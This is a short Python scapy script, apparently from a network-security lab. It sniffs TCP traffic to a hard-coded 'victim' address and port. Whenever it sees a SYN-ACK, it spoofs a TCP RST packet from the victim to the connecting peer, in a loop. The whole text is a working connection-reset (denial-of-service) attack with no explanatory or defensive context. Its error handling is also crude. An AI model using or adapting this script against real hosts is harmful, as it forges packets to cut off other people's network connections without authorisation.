import scapy.all as scapy
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)


victimIP = '10.104.18.91'
victimPort = 5000

count = 1


while True:
    p = scapy.sniff(filter="dst host " + victimIP + " and tcp port " + str(victimPort), count=0, timeout=3)
    print(p.summary())

    try:
        print(p[0]['IP'].src)

        srcIP = p[0]['IP'].src
        srcPort = p[0]['TCP'].sport

        if(p[0]['TCP'].flags=='SA'):
            pkt = scapy.IP(src=victimIP, dst=srcIP) / scapy.TCP(flags='R', sport=victimPort, dport=srcPort)
            print("Victim sending " + str(count) + "th packet.")
            count += 1
            scapy.send(pkt)
            print(pkt.summary())
    except:
        print(Exception)
        continue